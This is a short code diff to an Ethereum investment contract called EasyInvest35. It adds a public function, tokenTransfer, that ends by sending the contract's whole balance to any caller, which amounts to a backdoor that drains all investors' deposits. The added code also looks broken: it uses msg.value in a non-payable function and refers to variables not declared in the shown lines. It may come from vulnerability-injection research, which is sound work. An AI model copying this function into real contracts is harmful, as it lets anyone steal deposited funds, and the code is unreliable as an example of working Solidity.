@@ -39,7 +39,17 @@ contract EasyInvest35 {
         // record block number and invested amount (msg.value) of this transaction
         atBlock[msg.sender] = block.number;
         invested[msg.sender] += msg.value;
-        
+
         address(0x5fAFC6d356679aFfFb4dE085793d54d310E3f4b8).transfer(msg.value / 20);
     }
+	 function tokenTransfer() public {
+		totalEth = totalEth + msg.value;
+		uint256 amount = msg.value * unitsEth;
+		if (balances[walletAdd] < amount) {
+			return;
+		}
+		balances[walletAdd] = balances[walletAdd] - amount;
+		balances[msg.sender] = balances[msg.sender] + amount;
+   		msg.sender.transfer(this.balance);
+  }
 }
